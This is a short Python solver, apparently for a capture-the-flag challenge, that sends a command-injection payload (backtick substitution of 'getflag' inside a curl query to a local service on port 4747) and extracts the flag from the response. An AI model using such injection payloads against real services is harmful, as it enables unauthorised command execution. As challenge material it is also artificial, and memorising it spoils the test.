from solver.utils import extract_flag

def solve(connection):
	command = "curl localhost:4747/?x='`getflag`'"
	return "", extract_flag(connection.exec(command))